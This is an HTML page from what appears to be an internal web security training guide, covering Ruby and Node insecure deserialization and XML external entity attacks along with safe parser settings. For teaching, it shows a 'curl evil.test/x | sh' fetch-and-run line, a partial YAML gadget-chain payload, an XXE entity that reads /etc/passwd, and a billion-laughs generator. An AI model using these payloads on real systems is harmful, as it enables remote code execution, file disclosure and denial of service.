@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en" data-lang="rails">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>14 Deserialization and XXE · Web Security</title>
+
+<link rel="icon" href="favicon.ico" sizes="32x32">
+<link rel="icon" href="favicon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="apple-touch-icon.png">
+<link rel="manifest" href="site.webmanifest">
+<meta name="theme-color" content="#000000">
+<link rel="stylesheet" href="assets/site.css?v=8f1e007517">
+<script src="assets/consent.js?v=9320b4a322"></script>
+</head>
+<body data-slug="14-deserialization-and-xxe">
+<div class="win">
+  <div class="titlebar"><span class="dots"><i></i><i></i><i></i></span><span class="t">guest@websec: ~/websec/14-deserialization-and-xxe — zsh — 100×40</span>
+    <a class="by" href="about.html" title="About the author"><span class="w0">by </span>SaKKo</a>
+    <span class="lsw" role="group" aria-label="Language"><a href="14-deserialization-and-xxe.html" aria-current="true" data-setlang="en">EN</a><a href="th/14-deserialization-and-xxe.html" data-setlang="th">TH</a></span>
+    <span class="langsw" role="group" aria-label="Code examples language"><span class="d">code:</span><button type="button" data-l="rails">rails</button><button type="button" data-l="node">node</button></span></div>
+  <nav class="top" aria-label="Sections"><a href="index.html" title="Web Security Field Guide">~/</a>
+<a class="trk on" href="index.html#security">#1 security</a>
+<a class="trk" href="r01-rails-api-app.html">#2 rails</a>
+<span class="grp">|</span>
+<a href="01-introduction.html" title="Introduction">01·introduction</a>
+<a href="02-sql-injection.html" title="SQL Injection">02·sql-injection</a>
+<a href="03-unsafe-query-generation.html" title="Unsafe Query Generation">03·query-shape</a>
+<a href="04-xss-and-other-injection.html" title="XSS and Other Injection">04·xss</a>
+<span class="grp">| accounts:</span>
+<a href="05-authentication.html" title="Authentication">05·auth</a>
+<a href="05b-mfa.html" title="Multi-Factor Authentication">05b·mfa</a>
+<a href="06-sessions.html" title="Sessions">06·sessions</a>
+<a href="07-csrf.html" title="Cross-Site Request Forgery">07·csrf</a>
+<a href="08-user-management.html" title="User Management">08·accounts</a>
+<a href="09-mass-assignment-and-authorization.html" title="Mass Assignment and Authorization">09·authz</a>
+<span class="grp">| browser:</span>
+<a href="10-redirection-and-files.html" title="Redirection and Files">10·files</a>
+<a href="11-http-security-headers.html" title="HTTP Security Headers">11·headers</a>
+<a href="12-transport-cookies-third-party.html" title="Transport, Cookies and Third-Party Scripts">12·cookies-tls</a>
+<span class="grp">| server:</span>
+<a href="13-ssrf.html" title="Server-Side Request Forgery">13·ssrf</a>
+<a href="14-deserialization-and-xxe.html" aria-current="page" title="Deserialization and XXE">14·deserialize</a>
+<a href="15-environmental-security.html" title="Environmental Security">15·secrets</a>
+<a href="16-cryptography.html" title="Cryptography and Data Protection">16·crypto</a>
+<a href="17-dependencies-and-cves.html" title="Dependencies and CVEs">17·dependencies</a>
+<span class="grp">| ops:</span>
+<a href="18-intranet-and-admin.html" title="Intranet and Admin Security">18·admin</a>
+<a href="19-misconfiguration-and-errors.html" title="Misconfiguration and Error Handling">19·misconfig</a>
+<a href="20-insecure-design.html" title="Insecure Design and Business Logic">20·design</a>
+<a href="21-logging-and-incident-response.html" title="Logging, Alerting and Incident Response">21·logging</a>
+<a href="22-additional-resources.html" title="Additional Resources">22·resources</a>
+<span class="grp">| questionnaires:</span>
+<a href="q1-developer-survey.html" title="Developer Security Survey">Q1·developer</a>
+<a href="q2-awareness-survey.html" title="Cyber Threat Awareness Survey">Q2·cyber</a></nav>
+  <main>
+<div class="col">
+<p class="prompt">guest@websec ~ % <b>man 14-deserialization-and-xxe</b></p>
+<h1>14 · Deserialization and XXE</h1>
+<p class="lede">Some data formats can rebuild any object, read files, or balloon to gigabytes. Parse them from strangers and the input decides what your server does.</p>
+<h2>14.1 Insecure deserialization</h2>
+<p>JSON only rebuilds plain data. Ruby's <code>Marshal</code> and YAML with object tags can rebuild <i>any class</i>.</p>
+<p>So the attacker picks which objects get built. Chain a few ordinary classes together and you get code execution from one request.</p>
+<div class="warn">Rails got hit by this in 2013: one POST could take over any Rails app on the internet.</div>
+<div class="anim" data-actors="Attacker|Rails app|Ruby runtime" data-title="Deserialization to code execution"><script type="application/json">[{"f": 0, "t": 1, "l": "cookie / param / upload containing a Marshal or YAML payload", "k": "a", "c": "The attacker sends serialized data that describes objects, not just values."}, {"n": 1, "l": "Marshal.load(data) / YAML.unsafe_load(data)", "k": "a", "c": "Our code rebuilds whatever objects the bytes describe."}, {"f": 1, "t": 2, "l": "instantiate gadget classes from loaded gems", "k": "a", "c": "Ordinary classes are chained so that their initialization or cleanup code calls something dangerous."}, {"n": 2, "l": "system(\"curl evil.test/x | sh\")", "k": "a", "c": "<b>Remote code execution<\/b>, without any bug in our own logic."}, {"n": 1, "l": "JSON.parse / YAML.safe_load", "k": "k", "c": "Safe parsers only build plain data types and refuse object tags."}]</script></div>
+<div class="demo"><header><b>sim: loading a YAML document</b><span>pattern-based simulation of Psych's behavior</span></header><div class="body">
+<label for="ym-in">YAML from the request</label>
+<textarea id="ym-in" rows="6">--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Gem::SpecFetcher
+i: y
+--- !ruby/object:Gem::Requirement
+requirements: !ruby/object:Gem::Package::TarReader
+  io: &amp;1 !ruby/object:Net::BufferedIO
+    debug_output: !ruby/object:Net::WriteAdapter
+      method_id: :system</textarea>
+<div class="row" style="margin-top:8px"><button class="btn" data-ym="name: Ana
+tags: [admin, beta]
+limit: 10" type="button">plain data</button><button class="btn" data-ym="created: 2026-11-14" type="button">a date</button><button class="btn" data-ym="--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Net::WriteAdapter
+  method_id: :system" type="button">gadget chain</button></div>
+<div class="grid3" style="margin-top:10px">
+<div class="box"><p class="cap r">YAML.unsafe_load</p><div class="out" id="ym-a"></div></div>
+<div class="box"><p class="cap g">YAML.load (Psych 4+, Ruby 3.1+)</p><div class="out" id="ym-b"></div></div>
+<div class="box"><p class="cap g">JSON.parse</p><div class="out" id="ym-c"></div></div>
+</div></div></div>
+<p>Defenses:</p>
+<ul>
+<li>Use <b>JSON</b> for anything from outside.</li>
+<li>Need YAML from users? <code>YAML.safe_load</code>.</li>
+<li>Never <code>Marshal.load</code> untrusted bytes.</li>
+
+</ul>
+<div class="rp partial">Modern Rails is safe by default: JSON cookies, no XML params, safe YAML. <b>Check older apps</b> for a <code>:marshal</code> cookie serializer and any <code>Marshal.load</code>.</div><div class="code">
+<pre data-lang="rails"><span class="c"># safe by default on Ruby 3.1+ (Psych 4)</span>
+YAML.load(user_yaml)                                        <span class="c"># plain types only</span>
+YAML.safe_load(user_yaml, permitted_classes: [Date, Symbol])
+JSON.parse(user_json)
+
+<span class="bad">YAML.unsafe_load(user_yaml)        # arbitrary objects</span>
+<span class="bad">Marshal.load(Base64.decode64(params[:state]))   # RCE</span>
+
+<span class="c"># config/initializers/cookies_serializer.rb (older apps: check this!)</span>
+Rails.application.config.action_dispatch.cookies_serializer = :json</pre>
+<pre data-lang="node"><span class="c">// JS: JSON.parse is data-only. Danger comes from libraries that revive objects</span>
+JSON.parse(body);                                   <span class="ok">// plain data</span>
+<span class="bad">require("node-serialize").unserialize(body);        // has executed functions (CVE-2017-5941)</span>
+<span class="bad">yaml.load(text)                                     // js-yaml 3.x: can build functions (4.x is safe)</span></pre>
+</div>
+<h2>14.2 XML External Entities (XXE)</h2>
+<p>XML can point to external files. A careless parser will read <code>/etc/passwd</code> and hand it back, or expand a 1 KB file into gigabytes.</p>
+<p>XML hides in SAML, RSS, SVG and Office files.</p>
+<div class="anim" data-actors="Attacker|Rails app (XML import)|Server filesystem" data-title="XXE reading a server file"><script type="application/json">[{"f": 0, "t": 1, "l": "upload: <!ENTITY x SYSTEM \"file:///etc/passwd\"> … <name>&x;<\/name>", "k": "a", "c": "An XML upload declares an external entity and uses it in a field."}, {"n": 1, "l": "parser with NOENT / DTDLOAD enabled", "k": "a", "c": "Some parser options tell it to substitute external entities."}, {"f": 1, "t": 2, "l": "read /etc/passwd", "k": "a", "c": "The parser reads the file on the server."}, {"f": 1, "t": 0, "l": "\"Imported contact: root:x:0:0:…\"", "k": "a", "c": "The file's contents come back inside the imported data."}, {"n": 1, "l": "Nokogiri defaults: no entity substitution, no network", "k": "k", "c": "With Nokogiri's default options, the entity stays an unresolved reference."}]</script></div>
+<div class="demo"><header><b>sim: billion laughs</b><span>how nested entities explode</span></header><div class="body">
+<div class="row"><label for="bl-lv">nesting levels</label><input id="bl-lv" max="10" min="1" style="flex:1;accent-color:var(--fg)" type="range" value="9"/><span id="bl-lvv"></span></div>
+<pre class="plain" id="bl-doc" style="margin-top:8px;font-size:12px"></pre>
+<div class="out" id="bl-out" style="margin-top:8px"></div>
+</div></div>
+<div class="rp yes">Nokogiri is safe by default. Just never pass <code>noent</code> or <code>dtdload</code>.</div><div class="code">
+<pre data-lang="rails">doc = Nokogiri::XML(upload.read)                 <span class="c"># safe defaults</span>
+doc = Nokogiri::XML(upload.read) { |c| c.strict.nonet }
+
+<span class="bad">Nokogiri::XML(xml) { |c| c.noent.dtdload }        # enables XXE</span>
+<span class="bad">Nokogiri::XML(xml, nil, nil, Nokogiri::XML::ParseOptions::NOENT)</span></pre>
+</div>
+</div>
+
+<div class="col"><label class="readmark"><input type="checkbox" id="read-14-deserialization-and-xxe"> mark section 14 as read</label><div class="pager"><a href="13-ssrf.html">◀ 13 Server-Side Request Forgery</a><a href="15-environmental-security.html">15 Environmental Security ▶</a></div></div>
+  </main>
+  <footer class="site">Based on the <a href="https://guides.rubyonrails.org/security.html">Ruby on Rails Security Guide</a> (CC BY-SA 4.0), the <a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheet Series</a>, the <a href="https://owasp.org/Top10/2025/">OWASP Top 10:2025</a> and <a href="https://infosec.mozilla.org/guidelines/web_security.html">Mozilla's Web Security Guidelines</a>. Written for our dev team; code samples are illustrative.</footer>
+</div>
+<script src="assets/site.js?v=92ac7aa3f8"></script>
+<script>
+
+function ym() {
+  const v = $("#ym-in").value, tags = [...v.matchAll(/!ruby\/(object|hash|struct|marshal):?([\w:]*)/g)].map(m => m[2] || m[1]);
+  const hasDate = /\d{4}-\d{2}-\d{2}/.test(v);
+  if (tags.length) {
+    $("#ym-a").innerHTML = tags.map(t => `<span class="r">instantiates ${esc(t)}</span>`).join("\n") + (tags.some(t => /WriteAdapter|BufferedIO|TarReader/.test(t)) ? '\n<span class="r">→ gadget chain reaches Kernel#system: code execution</span>' : "");
+    $("#ym-b").innerHTML = `<span class="g">Psych::DisallowedClass:\nTried to load unspecified class: ${esc(tags[0])}</span>`;
+  } else {
+    $("#ym-a").innerHTML = '<span class="y">loads plain data (fine here, dangerous by design)</span>';
+    $("#ym-b").innerHTML = hasDate ? '<span class="y">Psych::DisallowedClass: Date\n(add permitted_classes: [Date])</span>' : '<span class="g">loads plain data</span>';
+  }
+  $("#ym-c").innerHTML = '<span class="g">only strings, numbers, booleans, null, arrays, hashes exist in JSON: no objects to instantiate</span>';
+}
+$("#ym-in").addEventListener("input", ym); $$("[data-ym]").forEach(b => b.onclick = () => { $("#ym-in").value = b.dataset.ym; ym(); }); ym();
+function blf() {
+  const n = +$("#bl-lv").value; $("#bl-lvv").textContent = n;
+  let d = '<?xml version="1.0"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol0 "lol">\n';
+  for (let i = 1; i <= n; i++) d += `  <!ENTITY lol${i} "${Array(10).fill("&lol" + (i - 1) + ";").join("")}">\n`;
+  d += `]>\n<lolz>&lol${n};</lolz>`;
+  $("#bl-doc").textContent = d;
+  const bytes = 3 * Math.pow(10, n), fmt = b => b >= 1e9 ? (b / 1e9).toFixed(1) + " GB" : b >= 1e6 ? (b / 1e6).toFixed(1) + " MB" : b >= 1e3 ? (b / 1e3).toFixed(1) + " KB" : b + " B";
+  $("#bl-out").innerHTML = `document size: ${d.length} bytes → expands to <b>${fmt(bytes)}</b> (${(10 ** n).toLocaleString()} copies of "lol")` + (bytes > 1e8 ? '\n<span class="r">enough to exhaust a server\'s memory</span>' : "") + '\n<span class="d">defense: disable DTDs / entity expansion (Nokogiri default), limit upload size</span>';
+}
+$("#bl-lv").addEventListener("input", blf); blf();
+
+</script>
+</body>
+</html>
